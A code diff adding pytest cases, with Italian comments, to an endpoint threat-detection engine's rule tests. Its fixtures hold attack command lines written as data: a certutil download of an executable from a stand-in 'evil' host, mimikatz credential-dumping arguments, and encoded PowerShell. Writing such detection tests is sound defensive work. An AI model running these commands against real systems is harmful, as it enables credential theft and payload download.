@@ -416,3 +416,167 @@ class TestThreatDatabaseSize:
 
     def test_script_interpreters_count(self):
         assert len(SCRIPT_INTERPRETERS) >= 30
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  AUDIT — bypass chiusi, FP rimossi, campi reali
+# ═══════════════════════════════════════════════════════════════════
+
+class TestAuditEncodedCommandRealField:
+    def test_command_line_only_triggers(self):
+        r = rule_encoded_command(make_event(
+            "powershell.exe",
+            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==",
+        ))
+        assert r.triggered and r.severity == "HIGH"
+
+    def test_short_base64_triggers(self):
+        r = rule_encoded_command(make_event(
+            "powershell.exe",
+            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell.exe -e SQBuAHYAbwBrAGEAAAA=",
+        ))
+        assert r.triggered
+
+    def test_forward_slash_temp_triggers_path_rule(self):
+        from app.rules.rule_definitions import rule_suspicious_execution_path
+        r = rule_suspicious_execution_path(
+            make_event("evil.exe", process_path="C:/Users/vic/AppData/Local/Temp/evil.exe"))
+        assert r.triggered
+
+
+class TestAuditRenameBypass:
+    def test_renamed_tool_in_path_triggers(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Temp\mimikatz.exe",
+            command_line="svchost.exe sekurlsa::logonpasswords"))
+        assert r.triggered
+
+    def test_tool_in_command_line_triggers(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe",
+            command_line="powershell -c mimikatz sekurlsa::logonpasswords"))
+        assert r.triggered
+
+    def test_legitimate_svchost_silent(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe"))
+        assert not r.triggered
+
+
+class TestAuditMalwareFamilyBoundaries:
+    # Nomi che erano FP sistematici col vecchio substring-match.
+    @pytest.mark.parametrize("name", ["uploader.exe", "bitcoin-qt.exe",
+                                      "examiner.exe"])
+    def test_lookalikes_not_flagged(self, name):
+        assert not rule_malware_family(make_event(name)).triggered
+
+    def test_known_residuals_documented(self):
+        # Residui noti (rari in enterprise, severita' contenuta):
+        # "stealthservice" inizia davvero con "steal", "passwordsafe" E' un
+        # password manager (descrizione "Password-related" veritiera, MEDIUM).
+        assert rule_malware_family(make_event("stealthservice.exe")).triggered
+        assert rule_malware_family(make_event("passwordsafe.exe")).severity == "MEDIUM"
+
+    def test_mitre_tactic_id_is_code(self):
+        r = rule_malware_family(make_event("lockbit.exe"))
+        assert r.triggered
+        assert r.mitre_tactic_id == "TA0040"
+        assert not str(r.mitre_tactic_id).startswith("Tactic ")
+
+
+class TestAuditLolbinSystem32Args:
+    def test_certutil_download_args_trigger(self):
+        r = rule_lolbin_usage(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe",
+            command_line="certutil -urlcache -split -f http://evil/x.exe C:\\Temp\\x.exe"))
+        assert r.triggered and r.severity == "HIGH"
+
+    def test_certutil_clean_silent(self):
+        r = rule_lolbin_usage(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe"))
+        assert not r.triggered
+
+
+class TestAuditDllLoadedModules:
+    def test_loaded_dll_in_temp_triggers(self):
+        r = rule_dll_hijack_path(make_event(
+            "explorer.exe", process_path=r"C:\Windows\explorer.exe",
+            loaded_modules=[r"C:\Users\vic\AppData\Local\Temp\evil.dll"]))
+        assert r.triggered
+
+    def test_loaded_dll_system32_silent(self):
+        r = rule_dll_hijack_path(make_event(
+            "explorer.exe", process_path=r"C:\Windows\explorer.exe",
+            loaded_modules=[r"C:\Windows\System32\kernel32.dll"]))
+        assert not r.triggered
+
+
+class TestAuditNetworkToolStem:
+    def test_masscan_exe_in_temp_flagged(self):
+        r = rule_network_tool(
+            make_event("masscan.exe", process_path=r"C:\Users\vic\AppData\Local\Temp\masscan.exe"))
+        assert r.triggered
+
+
+class TestAuditBeaconHighRisk:
+    def test_anydesk_public_beacon_triggers(self):
+        r = rule_network_beacon(make_event(
+            "anydesk.exe", process_path=r"C:\Program Files\AnyDesk\anydesk.exe",
+            network_connections=[{"remote": "8.8.8.8:443", "state": "ESTABLISHED"}]))
+        assert r.triggered
+
+    def test_ipv6_loopback_not_public(self):
+        r = rule_network_beacon(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe",
+            network_connections=[{"remote": "[::1]:443", "state": "ESTABLISHED"}]))
+        assert not r.triggered
+
+
+class TestAuditAutorunFuzzy:
+    def test_typosquat_variant_triggers(self):
+        r = rule_persistence_autorun(make_event(
+            "svch0sts.exe", process_path=r"C:\Users\vic\AppData\Local\Temp\svch0sts.exe"))
+        assert r.triggered
+
+    def test_real_svchost_system32_silent(self):
+        r = rule_persistence_autorun(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe"))
+        assert not r.triggered
+
+
+@pytest.mark.asyncio
+async def test_engine_stamps_rule_ids_live(engine):
+    e = make_event("mimikatz.exe")
+    r = await engine.analyze(e)
+    assert r.is_threat
+    ids = {t.rule_id for t in r.triggered_rules}
+    assert "AEGIS-S001" in ids
+    assert "custom" not in ids
+
+
+@pytest.mark.asyncio
+async def test_engine_allowlist_bypass_closed(engine):
+    # updater.exe in TEMP con mimikatz in cmdline DEVE alertare.
+    e = make_event("updater.exe",
+                   process_path=r"C:\Users\vic\AppData\Local\Temp\updater.exe",
+                   command_line="updater.exe mimikatz sekurlsa::logonpasswords")
+    r = await engine.analyze(e)
+    assert r.is_threat
+
+
+@pytest.mark.asyncio
+async def test_engine_allowlist_legit_updater_silent(engine):
+    e = make_event("updater.exe",
+                   process_path=r"C:\Program Files\Vendor\updater.exe")
+    r = await engine.analyze(e)
+    assert not r.is_threat
+
+
+@pytest.mark.asyncio
+async def test_engine_custom_rule_commandline_alias(engine, tmp_path=None):
+    from app.rules.heuristic_engine import _match_event_field
+    e = make_event("x.exe", command_line="mimikatz sekurlsa")
+    assert _match_event_field(e, "commandLine") == "mimikatz sekurlsa"
+    assert _match_event_field(e, "command_line") == "mimikatz sekurlsa"
